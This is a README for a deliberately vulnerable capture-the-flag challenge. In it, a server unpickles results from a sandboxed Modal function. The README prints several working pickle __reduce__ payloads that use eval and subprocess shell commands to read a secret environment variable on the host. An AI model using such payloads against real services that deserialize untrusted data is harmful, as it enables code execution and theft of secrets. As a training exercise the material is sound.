# Modal CTF Challenge - Pickle Deserialization Vulnerability

This is a Capture The Flag (CTF) challenge designed to demonstrate and test the security of Modal's sandbox when dealing with pickle deserialization vulnerabilities.

## ⚠️ WARNING
This application is **intentionally vulnerable** for educational and testing purposes. Do not deploy this in a production environment.

## Architecture

This CTF has two components:

1. **Modal Function** (`modal_function.py`): A restricted Modal function that executes Python code in a sandboxed container
2. **Local Server** (`server.py`): A FastAPI server that runs on your VM, accepts HTTP requests, and calls the Modal function

The vulnerability occurs when the local server receives the pickled result from Modal and deserializes it, allowing arbitrary code execution on the host VM.

## Challenge Description

The goal is to capture the flag (stored in the `FLAG` environment variable on the host VM) by exploiting the pickle deserialization vulnerability. User-submitted code runs in a Modal container with restrictions, but the result is pickled and sent back to the host, where it's unpickled - creating the vulnerability.

## Project Structure

```
modal-ctf/
├── modal_function.py    # Modal function (runs in cloud)
├── server.py            # Local FastAPI server (runs on VM)
├── public/
│   └── index.html       # Web interface with CTF instructions
├── requirements.txt     # Python dependencies
├── deploy_modal.sh      # Deploy Modal function to cloud
└── README.md           # This file
```

## Quick Start

### 1. Deploy the Modal Function

```bash
./deploy_modal.sh
```

### 2. Set the FLAG and Start Server

```bash
export FLAG="CTF{your_secret_flag_here}"
./start_docker.sh
```

## Detailed Setup

## API

The server accepts raw Python code as the POST body (not JSON):

```bash
# Simple test
curl -X POST http://localhost/execute -d 'print("Hello"); 42'

# Working exploit - multi-line class definition
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))

FlagExploit()
EOF

# One-liner exploit
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
EOF
```

## How It Works

1. User submits Python code via HTTP POST to `/execute`
2. The server sends the raw code to Modal's sandboxed function
3. Modal executes the code safely in a container
4. Modal pickles the result to send it back
5. **VULNERABILITY**: The server unpickles the result
6. If the object has a malicious `__reduce__` method, it executes on the host

## The Exploit

The vulnerability occurs because Modal pickles/unpickles the result when returning it from the remote function. If the result object has a `__reduce__` method, it gets executed during unpickling on the host.

### Working Exploits

#### Multi-line Class Definition

```python
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))

FlagExploit()
```

#### One-liner Version

```python
# Create a malicious object in a single expression
type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
```

Both approaches work because:
1. The class has a `__reduce__` method that gets called during unpickling
2. When unpickled on the host, it executes code that has access to the FLAG environment variable
3. The result is returned as part of the JSON response

### Alternative Exploits

```python
# Using subprocess to get the flag
class FlagExploit:
    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))

FlagExploit()
```

```python
# Writing flag to a file (useful for debugging)
type('E', (), {'__reduce__': lambda s: (__import__('subprocess').call, (['sh', '-c', 'echo "Flag is: $FLAG" > /tmp/ctf_flag.txt'],))})()
```

## Testing

```bash
# Run tests
python3 test_local.py

# Or test with curl
curl -X POST http://localhost:8000/execute -d 'print("test"); 123'
```

## Full Setup Instructions

### Install Dependencies

```bash
pip3 install -r requirements.txt
```

### Authenticate with Modal

```bash
python3 -m modal setup
```

### Deploy Everything

```bash
# Deploy Modal function
./deploy_modal.sh

# Set FLAG and start server
export FLAG="CTF{your_flag_here}"
./start_docker.sh
```

```

## Security Notes

- Modal function has `restrict_modal_access=True` and `block_network=True`
- The container is secure - the vulnerability is in the host's unpickling
- This demonstrates why untrusted data should never be unpickled

## Expected Behavior

- **Container execution**: Code runs as 'root' in Modal container
- **Successful exploit**: Returns the FLAG value from the host VM
- **Host info**: Shows the VM's actual hostname and username

## Mitigation

Your forked `modal-client` should use safe deserialization (JSON) instead of pickle for untrusted data.
